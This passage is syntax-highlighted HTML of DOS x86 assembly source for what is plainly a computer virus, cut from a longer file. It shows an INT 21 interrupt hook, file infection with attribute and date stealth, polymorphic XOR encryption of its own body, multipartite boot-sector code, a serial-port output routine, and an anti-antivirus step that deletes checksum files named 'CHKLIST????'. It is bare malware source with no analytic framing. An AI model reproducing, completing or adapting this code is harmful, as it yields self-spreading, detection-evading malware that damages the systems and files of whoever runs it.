</span><span class="sc5">jmp_a_return</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc0">

</span><span class="sc5">close_it</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">force_close</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">a_return</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">opened_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">old_int_10_21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">original_int_10</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

</span><span class="sc5">test_if_open</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">READING_STEALTH</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">DEFLECT_DELETE</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">EXEC_PROGRAM</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">error_in_copy</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">drive_letter</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">USING_HARD_DISK</span><span class="sc0">

        </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">error_in_copy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">GET</span><span class="sc4">+</span><span class="sc5">FILE_ATTRIBUTES</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">RENAME_A_FILE</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

</span><span class="sc5">set_attribs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">CREATE_NEW_FILE</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">error_in_copy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">SET</span><span class="sc4">+</span><span class="sc5">FILE_ATTRIBUTES</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">SYSTEM</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">ANTI_ANTIVIRUS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fcb_name</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">DELETE_W_FCB</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">SCRATCH_AREA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">full_move</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_some_more</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">FILE_LEN_OFFSET</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DOUBLE_DECRIPT</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc5">set_second</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">RES_OFFSET</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">SECOND_UNDO_OFF</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">set_second</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">XOR_SWAP_OFFSET</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

</span><span class="sc5">set_first</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">set_first</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

</span><span class="sc5">file_length</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">WRITE_W_HANDLE</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">cwd</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">SAME_FILE_DATE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">SET</span><span class="sc4">+</span><span class="sc5">FILE_DATE_TIME</span><span class="sc0">

</span><span class="sc5">new_time</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0">

</span><span class="sc5">new_date</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21_close</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">force_close</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_attribs</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">interrupt_21</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">open_close_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">OPEN_W_HANDLE</span><span class="sc4">+</span><span class="sc5">DENYNONE</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">more_returns</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HEADER_SEGMENT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MODEM_CODE</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">NO_OF_COM_PORTS</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">NO_OF_COM_PORTS</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">scan_coms</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">js</span><span class="sc0">  </span><span class="sc5">no_more_coms</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">GET_PORT_STATUS</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">SERIAL_INT</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">DELTA_RI</span><span class="sc4">+</span><span class="sc5">CTS</span><span class="sc4">+</span><span class="sc5">DSR</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">DELTA_RI</span><span class="sc4">+</span><span class="sc5">CTS</span><span class="sc4">+</span><span class="sc5">DSR</span><span class="sc4">+</span><span class="sc5">CD</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">scan_coms</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc4">+</span><span class="sc5">STRING_LENGTH</span><span class="sc4">-</span><span class="sc5">ONE_BYTE</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">STRING_LENGTH</span><span class="sc0">

</span><span class="sc5">output_data</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">WRITE_TO_PORT</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">SERIAL_INT</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">output_data</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">no_more_coms</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">EXE_HEADER_SIZE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">READ_W_HANDLE</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">cwd</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc9">ELSE</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">LSEEK_TO_END</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FILE_LEN_OFFSET</span><span class="sc4">+</span><span class="sc5">RES_OFFSET</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_length</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MIN_FILE_SIZE</span><span class="sc4">+</span><span class="sc5">PSP_SIZE</span><span class="sc0">

        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">SAME_FILE_DATE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">GET</span><span class="sc4">+</span><span class="sc5">FILE_DATE_TIME</span><span class="sc0">

</span><span class="sc5">do_int21_close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">force_close</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">CLOSE_HANDLE</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

</span><span class="sc5">more_returns</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">open_close_file</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">full_move_w_si</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

</span><span class="sc5">swap_incbx_bl</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">BL_BX_OFFSET</span><span class="sc4">],</span><span class="sc5">INCBX_INCBL_XOR</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">BL_BX_OFFSET</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc4">],</span><span class="sc5">JNS_JNZ_XOR</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc5">full_move_w_di</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">RES_OFFSET</span><span class="sc0">

</span><span class="sc5">full_move</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_code</span><span class="sc0">

</span><span class="sc5">move_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">move_some_more</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">RES_OFFSET</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">CHECK_FOR_8088</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">ONE_NIBBLE</span><span class="sc0">

        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ROTATED_OFFSET</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ROTATED_OFFSET</span><span class="sc4">],</span><span class="sc5">ONE_NIBBLE</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">move_some_more</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">SECTOR_SIZE</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">full_move_w_si</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">ANTI_ANTIVIRUS</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc4">-</span><span class="sc5">ONE_BYTE</span><span class="sc0">

</span><span class="sc5">fcb_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">DEFAULT_DRIVE</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc0">

</span><span class="sc5">boot_code</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">initialize_boot</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">ANTI_ANTIVIRUS</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CHKLIST????'</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">BOOT_OFFSET</span><span class="sc4">-</span><span class="sc5">SECTOR_SIZE</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc4">+</span><span class="sc5">DESCRIPTOR_OFF</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">DESCRIPTOR</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">COM_CODE_SECTOR</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">BOOT_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">READ_A_SECTOR</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">BOOT_OFFSET</span><span class="sc4">-</span><span class="sc5">SECTOR_SIZE</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

